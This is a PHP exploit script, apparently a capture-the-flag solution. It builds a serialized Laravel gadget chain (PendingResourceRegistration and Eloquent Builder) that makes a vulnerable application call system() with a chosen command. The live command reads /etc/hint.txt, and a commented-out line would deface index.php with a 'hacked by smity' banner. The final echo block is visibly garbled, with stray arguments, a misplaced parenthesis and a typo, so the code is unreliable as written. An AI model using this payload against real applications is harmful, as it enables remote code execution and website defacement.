<?php

namespace Illuminate\Database\Eloquent {
    class Builder
    {
        protected $localMacros = ["register" => "Illuminate\Support\Arr::first"];
    }
}

namespace Illuminate\Routing {
    class PendingResourceRegistration
    {
        protected $registrar;
        protected $name = "call_user_func";

        public function __construct($registrar)
        {
            $this->registrar = $registrar;
        }
    }
}

namespace {
    //$cmd = "echo '<h1 style=\"color:red;text-align:center;font-size:100px\">hacked by smity; </h1>' > index.php ";
    $cmd = "cat /etc/hint.txt";
    $payload = new Illuminate\Database\Eloquent\Builder();
    $payload->$cmd = "system";
    echo urlencode(
        serialize(new Illuminate\Routing\PendingResourceRegistration($payload))
        #new Illuminate\Routing\PendingResourceRegistration($payload)
        #new Illuminate\Routing\PendingResourceRegistration(
        new Illuminate\Database\Eloquent\Builder(array("register"=>" Illuminate\Support\Arr::first"),"system"),
        "call_user_fun c",
        1,
        1);
    );
}